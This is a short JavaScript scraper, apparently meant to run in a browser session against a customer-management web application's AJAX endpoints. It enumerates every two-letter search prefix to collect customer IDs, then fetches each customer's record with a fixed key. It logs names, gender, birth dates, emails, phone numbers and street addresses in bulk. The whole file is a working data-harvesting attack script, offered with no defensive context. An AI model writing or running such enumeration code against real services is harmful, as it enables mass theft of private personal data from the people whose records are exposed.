"use strict";

function getArray(){
	var a = ['a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z'];
	var resultArray=new Array();
	var c;

	for(var x = 0; x  <= a.length -1; x++){
		for(var y = 0; y  <= a.length -1; y++){
			try{
				resultArray.push(a[x]+a[y]);
			}catch(err){}
		}
	}

	for(var z = 0; z  <= resultArray.length -1; z++){
		c += resultArray[z]+",";
	}
	return resultArray;
	
}

function getFirstLink(){
	var link = new Array();
	var prefix = "https://www.example.com/k1/clients_ajax/query/";
	var subfix = "/30/0/1/?exclude_casual=true";
	for(var x = 0; x < getArray().length; x++){
		for(var y = 0; y < 10; y++){
			link.push(prefix + getArray()[x] + "/" + y + subfix);
		}	
	}
	return link;
}



function getSecondLink(){
	var flink = getFirstLink();
	var slink = new Array();
	var sperfix = "https://www.example.com/k1/clients_ajax/get_customer_by_kid/79de97ed2d8871d5514ebff2ad6a6c52/";
	var ssubfix = "/true";
	for(var x in flink){
		$.getJSON(flink[x],function(re){
			for(var y =0; y < re.results.length; y++){
				var sublink = sperfix+re.results[y].kid+ssubfix;
				$.getJSON(sublink,function(z){
					console.log(z.data.first_name+ " " +z.data.last_name + "," + z.data.gender + "," +  z.data.birth_day + "," +  z.data.birth_month + "," +  z.data.birth_year + "," +  z.data.email + "," +  z.data.phone + "," +  z.data.postal_code + "," +  z.data.suburb + "," +  z.data.street);
				});
			}
		});
		console.log(x);
	}
}
